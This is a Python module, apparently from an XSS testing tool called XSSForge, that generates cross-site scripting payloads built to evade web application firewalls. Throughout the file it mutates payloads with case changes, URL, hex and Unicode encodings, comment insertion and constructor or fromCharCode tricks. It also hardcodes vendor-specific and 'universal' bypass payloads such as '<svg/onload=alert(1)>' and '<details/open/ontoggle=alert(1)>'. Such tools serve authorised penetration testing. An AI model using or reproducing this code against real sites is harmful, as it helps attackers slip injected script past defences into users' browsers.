"""
WAF bypass strategies for XSSForge.

Generates WAF-specific bypass payloads.
"""

from dataclasses import dataclass
from typing import Iterator

from xssforge.waf.fingerprint import WAFType
from xssforge.utils.encoding import Encoder
from xssforge.payloads.loader import get_loader


@dataclass
class BypassPayload:
    """A WAF bypass payload with metadata."""
    payload: str
    technique: str
    waf_target: WAFType | None = None
    confidence: float = 0.5  # How likely to work


class WAFBypass:
    """Generates WAF bypass payloads."""

    def __init__(self):
        self.encoder = Encoder()
        self.loader = get_loader()

    def generate_bypasses(
        self,
        base_payload: str,
        waf_type: WAFType = WAFType.UNKNOWN,
        max_variants: int = 20,
    ) -> list[BypassPayload]:
        """Generate bypass variants for a payload."""
        bypasses = []

        # Generic bypasses that work against multiple WAFs
        bypasses.extend(self._generic_bypasses(base_payload))

        # WAF-specific bypasses
        if waf_type != WAFType.UNKNOWN and waf_type != WAFType.NONE:
            bypasses.extend(self._waf_specific_bypasses(base_payload, waf_type))

        # Sort by confidence and dedupe
        seen = set()
        unique = []
        for bp in sorted(bypasses, key=lambda x: x.confidence, reverse=True):
            if bp.payload not in seen:
                seen.add(bp.payload)
                unique.append(bp)

        return unique[:max_variants]

    def _generic_bypasses(self, payload: str) -> list[BypassPayload]:
        """Generate generic bypass techniques."""
        bypasses = []

        # Case variations
        case_variants = [
            payload.replace("script", "ScRiPt"),
            payload.replace("script", "SCRIPT"),
            payload.replace("onerror", "oNeRrOr"),
            payload.replace("onload", "oNlOaD"),
            payload.replace("alert", "aLeRt"),
        ]
        for v in case_variants:
            if v != payload:
                bypasses.append(BypassPayload(
                    payload=v,
                    technique="case_variation",
                    confidence=0.4,
                ))

        # Whitespace alternatives
        whitespace_variants = [
            payload.replace(" ", "/"),
            payload.replace(" ", "%09"),  # Tab
            payload.replace(" ", "%0a"),  # Newline
            payload.replace(" ", "%0d"),  # Carriage return
            payload.replace(" ", "%0c"),  # Form feed
        ]
        for v in whitespace_variants:
            if v != payload:
                bypasses.append(BypassPayload(
                    payload=v,
                    technique="whitespace_bypass",
                    confidence=0.5,
                ))

        # Template literal trick
        if "alert(1)" in payload:
            bypasses.append(BypassPayload(
                payload=payload.replace("alert(1)", "alert`1`"),
                technique="template_literal",
                confidence=0.6,
            ))

        # HTML entity encoding
        if "<" in payload or ">" in payload:
            bypasses.append(BypassPayload(
                payload=self.encoder.html_encode(payload),
                technique="html_entity",
                confidence=0.3,
            ))

        # Hex HTML entities
        bypasses.append(BypassPayload(
            payload=self.encoder.hex_encode_html(payload),
            technique="hex_html_entity",
            confidence=0.4,
        ))

        # URL encoding
        bypasses.append(BypassPayload(
            payload=self.encoder.url_encode(payload),
            technique="url_encode",
            confidence=0.3,
        ))

        # Double URL encoding
        bypasses.append(BypassPayload(
            payload=self.encoder.double_url_encode(payload),
            technique="double_url_encode",
            confidence=0.4,
        ))

        # Null byte insertion
        if "<" in payload:
            bypasses.append(BypassPayload(
                payload=payload.replace("<", "<%00"),
                technique="null_byte",
                confidence=0.3,
            ))

        # Comment insertion
        if "script" in payload.lower():
            bypasses.append(BypassPayload(
                payload=payload.replace("script", "scr<!---->ipt"),
                technique="html_comment",
                confidence=0.3,
            ))

        # JavaScript comment in event handler
        if "alert" in payload:
            bypasses.append(BypassPayload(
                payload=payload.replace("alert", "al/**/ert"),
                technique="js_comment",
                confidence=0.4,
            ))

        # Constructor bypass
        if "alert(1)" in payload:
            bypasses.append(BypassPayload(
                payload=payload.replace(
                    "alert(1)",
                    "[].constructor.constructor('alert(1)')()"
                ),
                technique="constructor",
                confidence=0.5,
            ))

        # Window/self/top bracket notation
        if "alert(1)" in payload:
            for obj in ["window", "self", "top", "this"]:
                bypasses.append(BypassPayload(
                    payload=payload.replace("alert(1)", f"{obj}['alert'](1)"),
                    technique="bracket_notation",
                    confidence=0.5,
                ))

        # eval/setTimeout/setInterval
        if "alert(1)" in payload:
            bypasses.append(BypassPayload(
                payload=payload.replace("alert(1)", "eval('ale'+'rt(1)')"),
                technique="string_concat",
                confidence=0.4,
            ))
            bypasses.append(BypassPayload(
                payload=payload.replace("alert(1)", "setTimeout('alert(1)')"),
                technique="setTimeout",
                confidence=0.4,
            ))

        # fromCharCode
        if "alert" in payload:
            # alert = String.fromCharCode(97,108,101,114,116)
            bypasses.append(BypassPayload(
                payload=payload.replace(
                    "alert",
                    "String.fromCharCode(97,108,101,114,116)"
                ),
                technique="fromCharCode",
                confidence=0.4,
            ))

        return bypasses

    def _waf_specific_bypasses(
        self, payload: str, waf_type: WAFType
    ) -> list[BypassPayload]:
        """Generate WAF-specific bypass payloads."""
        bypasses = []

        if waf_type == WAFType.CLOUDFLARE:
            bypasses.extend(self._cloudflare_bypasses(payload))
        elif waf_type == WAFType.AKAMAI:
            bypasses.extend(self._akamai_bypasses(payload))
        elif waf_type == WAFType.MODSECURITY:
            bypasses.extend(self._modsecurity_bypasses(payload))
        elif waf_type == WAFType.AWS_WAF:
            bypasses.extend(self._aws_waf_bypasses(payload))
        elif waf_type == WAFType.IMPERVA:
            bypasses.extend(self._imperva_bypasses(payload))

        return bypasses

    def _cloudflare_bypasses(self, payload: str) -> list[BypassPayload]:
        """Cloudflare-specific bypasses."""
        bypasses = []

        # Cloudflare specific payloads from loader
        waf_payloads = self.loader.get_waf_bypasses("cloudflare")
        for wp in waf_payloads:
            bypasses.append(BypassPayload(
                payload=wp.get("payload", ""),
                technique=wp.get("note", "cloudflare_specific"),
                waf_target=WAFType.CLOUDFLARE,
                confidence=0.6,
            ))

        # SVG with slash
        if "<svg" in payload.lower():
            bypasses.append(BypassPayload(
                payload=payload.replace("<svg ", "<svg/"),
                technique="slash_separator",
                waf_target=WAFType.CLOUDFLARE,
                confidence=0.6,
            ))

        # Details tag alternative
        bypasses.append(BypassPayload(
            payload="<details/open/ontoggle=alert(1)>",
            technique="details_tag",
            waf_target=WAFType.CLOUDFLARE,
            confidence=0.7,
        ))

        return bypasses

    def _akamai_bypasses(self, payload: str) -> list[BypassPayload]:
        """Akamai-specific bypasses."""
        bypasses = []

        # Unicode escapes
        if "alert" in payload:
            bypasses.append(BypassPayload(
                payload=payload.replace("alert", "\\u0061lert"),
                technique="unicode_escape",
                waf_target=WAFType.AKAMAI,
                confidence=0.5,
            ))

        # HTML entity
        bypasses.append(BypassPayload(
            payload="<svg onload=&#97;lert(1)>",
            technique="html_entity",
            waf_target=WAFType.AKAMAI,
            confidence=0.5,
        ))

        return bypasses

    def _modsecurity_bypasses(self, payload: str) -> list[BypassPayload]:
        """ModSecurity-specific bypasses."""
        bypasses = []

        # Complex bypass
        bypasses.append(BypassPayload(
            payload="<svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            technique="complex_bypass",
            waf_target=WAFType.MODSECURITY,
            confidence=0.4,
        ))

        # Extra characters
        if "onerror" in payload.lower():
            bypasses.append(BypassPayload(
                payload=payload.replace("onerror", "onerror "),
                technique="extra_space",
                waf_target=WAFType.MODSECURITY,
                confidence=0.4,
            ))

        return bypasses

    def _aws_waf_bypasses(self, payload: str) -> list[BypassPayload]:
        """AWS WAF-specific bypasses."""
        bypasses = []

        # Hex escape
        if "alert" in payload:
            bypasses.append(BypassPayload(
                payload=payload.replace("alert", "\\x61lert"),
                technique="hex_escape",
                waf_target=WAFType.AWS_WAF,
                confidence=0.5,
            ))

        return bypasses

    def _imperva_bypasses(self, payload: str) -> list[BypassPayload]:
        """Imperva-specific bypasses."""
        bypasses = []

        # Partial unicode
        if "alert" in payload:
            bypasses.append(BypassPayload(
                payload=payload.replace("alert", "al\\u0065rt"),
                technique="partial_unicode",
                waf_target=WAFType.IMPERVA,
                confidence=0.5,
            ))

        # HTML entities for parens
        bypasses.append(BypassPayload(
            payload="<svg onload=alert&lpar;1&rpar;>",
            technique="html_entity_parens",
            waf_target=WAFType.IMPERVA,
            confidence=0.5,
        ))

        return bypasses

    def get_universal_bypasses(self) -> list[str]:
        """Get payloads that often bypass WAFs."""
        return [
            "<svg/onload=alert(1)>",
            "<img src=x onerror=alert`1`>",
            "<details/open/ontoggle=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<video src=x onerror=alert(1)>",
            "<body onpageshow=alert(1)>",
            "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
            "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
        ]
